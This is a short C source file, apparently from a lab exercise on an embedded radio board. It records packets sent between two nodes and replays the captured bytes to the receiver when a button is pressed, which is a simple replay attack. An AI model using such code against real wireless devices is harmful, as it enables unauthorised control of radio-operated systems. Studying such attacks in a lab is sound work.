/*
 * attack_exp1.c
 *
 * Created: 23/04/2019 13:28:05
 * Author : punith
 */ 

#include <stdio.h>
#include <serial.h>
#include <leds.h>
#include <button.h>
#include <radio.h>
#include <time.h>

// Transmitter is node 1
// Receiver is node 2

#define NODE 0x0001
#define DESTINATION 0x0002

static unsigned char buffer[128];

//radio and buttons initialized
void init() 
{
	leds_init();
	leds_on(LED_RED);
	serial_init(9600);
	printf("Demo TX program running on node %04x\n\r", NODE);
	leds_on(LED_ORANGE);
	button_init();
	radio_init(NODE);
	radio_start();
}

static unsigned char counter=0;
static unsigned long until=0;

void loop() {
	unsigned short dst=0;
	unsigned short src=0;
	unsigned char valid=0;
	unsigned char energy=0;
	unsigned char lqi=0;
	if (radio_rxed()) {
		unsigned char energy;
		unsigned char valid;

		int rxLen = radio_recv(&buffer[0],128,&dst,&src,&valid,&energy,&lqi);  //recording the data being transmitted
		printf("Message received from transmitter %04x to receiver %04x with data:", NODE,DESTINATION);
		for (int i=0; i<rxLen; i++)
			printf(" %02x ", buffer[i]);

		
	} 

	if (button_pressed()) {
		while (button_pressed()); 
		printf("Button pressed \n");
		leds_on(LED_GREEN);

		radio_send(buffer,4,0x0002);  //playing back the recorded code to receiver using the send method
		printf("Sent the recorded message from transmitter %04x to receiver %04x with data:",NODE,DESTINATION);
		for (int i=0;i<4;i++)
		{
			printf("%02x ",buffer[i]);
		}
		leds_off(LED_GREEN);
		
		until=time_millis()+1000;
	}
	   
}
